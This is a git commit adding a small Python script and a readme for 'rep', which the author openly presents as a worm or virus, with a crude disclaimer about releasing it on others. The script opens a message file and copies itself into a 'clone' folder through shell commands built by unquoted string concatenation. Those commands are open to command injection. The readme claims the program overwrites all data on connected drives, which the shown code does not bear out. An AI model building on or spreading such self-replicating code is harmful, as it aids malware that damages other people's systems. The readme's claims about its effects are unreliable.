1d82a4db4379ef7d6542a1c9a22aeafecb3a6731
hyperbeamf <hbeam@pop-os.localdomain>
2020-03-22 17:04:37 -0400

    Adds basic stuff for rep. Will be expanded on in the future

---
+++ clone/rep.py
@@ -0,0 +1,25 @@
+from sys import argv, platform
+import os
+
+script = argv
+name = str(script[0])
+
+linuxcmd = "xdg-open message.txt"
+wincmd   = "start message.txt"
+maccmd   = "open message.txt"
+
+if platform == "linux" or platform == "linux2":
+    os.system(linuxcmd)
+    os.mkdir('clone')
+    os.system("cp message.txt clone/")
+    os.system("cp " + name + " clone/")
+elif platform == "darwin":
+    os.system(maccmd)
+    os.mkdir('clone')
+    os.system("cp message.txt clone/")
+    os.system("cp " + name + " clone/")
+elif platform == "win32":
+    os.system(wincmd)
+    os.mkdir('clone')
+    os.system("copy message.txt clone")
+    os.system("copy " + name + " clone")
---
+++ readme.md
@@ -0,0 +1,9 @@
+# rep
+
+I am not responsible for any damages possibly done by this worm, I just created the software.
+
+If you release this on your town/business/whatever the fuck, I am not responsible for you being a dumbass and deciding to release a virus on them.
+
+Note that this virus is not harmful on its own, but it __may significantly slow down the PC that it is running on, and will overwrite all data on the drives it is connected to.__
+
+This worm made by hyperbeamf. srz beniz
